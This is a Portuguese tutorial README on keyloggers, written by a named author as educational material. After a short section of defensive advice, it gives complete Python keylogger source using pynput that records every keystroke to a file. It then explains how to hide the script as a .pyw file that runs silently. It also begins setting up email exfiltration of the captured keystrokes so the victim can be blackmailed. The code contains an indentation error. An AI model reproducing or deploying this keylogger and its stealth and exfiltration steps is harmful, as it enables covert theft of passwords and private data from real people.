# Documentação sobre Keylogger

Um keylogger (abreviação de keystroke logger, ou registrador de teclas) é um tipo de software ou dispositivo de hardware que monitora e registra cada tecla que um usuário digita em um teclado. 

Pode ser usado legalmente por pais para monitorar a segurança dos filhos ou por empresas para garantir a produtividade dos funcionários, em contextos maliciosos, os cibercriminosos o utilizam para roubar informações confidenciais, como: 

* Nomes de usuário e senhas

* Números de cartão de crédito e detalhes bancários

* Mensagens privadas e outras informações pessoais 

## Como o Keylogger Funciona?

Keyloggers podem ser instalados de várias maneiras: 

* Software: Frequentemente disfarçado de um arquivo ou programa legítimo (vírus Trojan) ou entregue por meio de e-mails de phishing e sites maliciosos.

* Hardware: Um pequeno dispositivo físico inserido entre o teclado e o computador, que captura os sinais das teclas pressionadas. 

## Como se Proteger

A melhor defesa contra keyloggers envolve uma combinação de software de segurança e práticas de navegação seguras: 

* Use um bom software antivírus/anti-malware: Instale e mantenha um programa de segurança confiável com recursos anti-spyware e antivírus. Ele pode detectar e remover keyloggers maliciosos.

* Mantenha seu software atualizado: Mantenha o sistema operacional, o navegador e o software de segurança sempre atualizados para corrigir vulnerabilidades que os keyloggers possam explorar.

* Seja cauteloso com e-mails e links: Evite clicar em links ou baixar anexos de e-mails, mensagens de texto ou postagens em redes sociais de remetentes desconhecidos ou suspeitos. Muitos keyloggers são disseminados por meio de phishing.

* Evite redes Wi-Fi públicas e não seguras: Cibercriminosos podem usar redes Wi-Fi de hotéis ou cafés para infectar dispositivos.

* Inspecione fisicamente o computador: Se você suspeitar de um keylogger de hardware, verifique visualmente as conexões do teclado em busca de dispositivos estranhos.

* Use um gerenciador de senhas: Usar um gerenciador de senhas para preencher automaticamente as credenciais de login pode ajudar, pois muitas vezes isso contorna o registro de teclas.

* Use a autenticação de dois fatores (2FA): Mesmo que um cibercriminoso obtenha sua senha, a 2FA oferece uma camada extra de segurança, exigindo um segundo código de verificação. 

# `Passos para simulação`

Todos os testes e códigos utilizados são apenas para fins didáticos. 

O Conhecimento construído tem por finalidade proteger sistemas e educar pessoas (**Isadora Ferrão**).

### Passo 1

Criação do ambiente controlado como a pasta keylogger e a instalação da biblioteca pynput.

*pip install pynput* no terminal do python.

A biblioteca pynput é uma biblioteca Python que permite controlar e monitorar dispositivos de entrada, como o mouse e o teclado, em diferentes sistemas operacionais (Windows, macOS, Linux). Ela é usada para automatizar tarefas repetitivas, criar atalhos de teclado (hotkeys) e registrar a atividade do usuário, nesse nosso caso irá funcionar como um keylogger. 

### Passo 2

Anotações sobre o que o código irá fazer:

1. Vai ficar em execução em segundo plano.
2. Toda vez que o usuário digitar uma tecla, o programa vai capiturar essa tecla.
3. O que for digitado será gravado em um arquivo .txt.
4. O arquivo vai mostrar tudo que foi digitado de forma sequencial.

### Passo 3:

O código presente é um registrador de teclas (keylogger) utilizando a biblioteca pynput em Python. Esse tipo de ferramenta pode ser utilizado para monitorar e registrar as teclas digitadas em um computador.

```python

from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # se for uma tecla normal (letra, numero, simbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
        f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

```

O código utiliza a biblioteca pynput para capturar eventos do teclado.

### 1. Importação da Biblioteca

A linha from pynput import keyboard importa o módulo keyboard da biblioteca pynput. Este módulo fornece as classes e funções necessárias para monitorar e controlar o teclado.

### 2. Implementação da Função on_press

A função on_press(key) é o "callback" do programa. Ela é chamada automaticamente pelo pynput.keyboard.Listener toda vez que uma tecla é pressionada. A função recebe um argumento, key, que representa a tecla que foi pressionada.

A lógica dentro da função é projetada para diferenciar entre diferentes tipos de teclas e registrá-las em um arquivo chamado log.txt:

* **Tratamento de Teclas Normais**: O bloco try tenta acessar key.char. Teclas normais (letras, números, símbolos) possuem um atributo char que contém o caractere correspondente. Se acessível, o caractere é gravado no arquivo log.txt.

** **Tratamento de Teclas Especiais:** O bloco except AttributeError é executado se a tecla pressionada não tiver um atributo char (ou seja, é uma tecla especial como Espaço, Enter, Shift, etc.). Dentro deste bloco:


    * Verificações if/elif mapeiam teclas especiais comuns (space, enter, tab, backspace, esc) para representações legíveis ou caracteres de formatação (espaço, quebra de linha, etc.).

    * Teclas listadas no conjunto IGNORAR (como Shift, Ctrl, Alt) são ignoradas (pass).

    * Outras teclas especiais não mapeadas explicitamente recebem uma representação em string, como [Key.cmd], no arquivo de log.

### 3. Implementação do Listener

O bloco final configura o monitoramento do teclado:

* with keyboard.Listener(on_press=on_press) as listener:: Cria uma instância do Listener e define a função on_press como a função de retorno de chamada para o evento de pressionar tecla.

* listener.join(): Inicia o listener em uma thread separada e mantém o programa principal em execução até que o listener seja interrompido (normalmente por um erro ou por uma interrupção manual).

# `Passos para tornar o keylogger invisível`

Tornando o Keylogger invisivel para o usuário, onde ele continurá rodando e monitorando o uso do teclado, sem exibir nenhuma interface ou janela. Este é o comportamento de um malware real.

### Passo 1:
O primeiro passo é alterar a extensão do arquivo `.py` para `.pyw`. No windows, os arquivos **pyw** são sripts python que rodam em segundo plano sem a necessidade de abrir o terminal. Isto é uma funcionalidade nativa do python no windows.

Dentro do temrinal, utiliza o comando *ren .\keylogger.py .\keylogger.pyw* alterando a extensão do arquivo de *py* para *pyw*. Outra forma de alterar é manualmente no arquivo com a opção de renomerar. 

* Quando rodar o script *python .\keylogger.pyw* nenhuma janela irá abrir e nenhuma informação sobre a execução irá abrir. Isso torna a execução silenciosa e continua monitorando toda utilização do teclado.

# `Passos para transmissão dos arquivos via E-mail `
O objetivo é tornar o keylogger mais parecido como em um ataque real. Alem de roubar as informações o malware envia os arquivos sequestrados via e-mail onde pode-se chantagear o usuário atacado.

### Passo 1:

* Criar uma conta de email específica para testes;

* Ativar a verificação de duas etapas do email de testes;

* Criar e Usar chave de acesso para confirmar usuário;

    * [My Account Google](https://myaccount.google.com/apppassword)

